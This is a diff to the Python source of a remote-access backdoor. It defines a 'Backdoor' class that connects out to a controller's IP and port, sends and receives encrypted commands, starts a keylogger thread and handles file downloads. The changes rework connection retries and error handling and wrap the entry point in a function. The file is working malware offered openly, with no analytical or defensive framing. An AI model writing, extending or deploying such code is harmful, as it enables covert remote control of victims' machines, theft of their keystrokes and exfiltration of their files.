@@ -17,17 +17,22 @@ from lib.UAC import *
 from lib.display import *
 from lib.env import get_env
 
+global connected, sock
 
 # main backdoor class and functions #################################################################
 class Backdoor:
     def __init__(self, ip, port):
+
         self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        self.connected = False
         while True:
-            try:
-                self.sock.connect((ip, port))
-                break
-            except socket.error:
-                continue
+            if not self.connected:
+                try:
+                    self.sock.connect((ip, port))
+                    self.connected = True
+                    break
+                except socket.error:
+                    continue
 
     # encrypt/decrypt data ###############################################################
     def encrypt(self, message):
@@ -43,9 +48,8 @@ class Backdoor:
         try:
             json_data = json.dumps(data)
             return self.sock.send(self.encrypt(json_data))
-        except:
-            return self.sock.send(
-                self.encrypt("\n \033[1;32;31m[-]\x1b[0m STDOUT parsing problem \033[1;32;31m[-]\x1b[0m \n"))
+        except Exception,e:
+            return e
             pass
 
     def receive(self):
@@ -75,13 +79,19 @@ class Backdoor:
         except:
             return "\033[1;32;31m[-]\x1b[0m no such file or directory \033[1;32;31m[-]\x1b[0m"
 
+
+
+
     # run commands #############################################################################################
     def run(self):
+
         global t1
         t1 = threading.Thread(target=lib.keylogger.start)
         while True:
+
             result = ""
             cmd = self.receive()
+
             if "terminate" in cmd:
                 sys.exit(0)
             elif cmd[0] == "download":
@@ -171,6 +181,10 @@ class Backdoor:
             self.json_send(result)
 
 
-if __name__ == '__main__':
-    starter = Backdoor(ip, port)
-    starter.run()
+def runner():
+    if __name__ == '__main__':
+        starter = Backdoor(ip, port)
+        starter.run()
+
+
+runner()
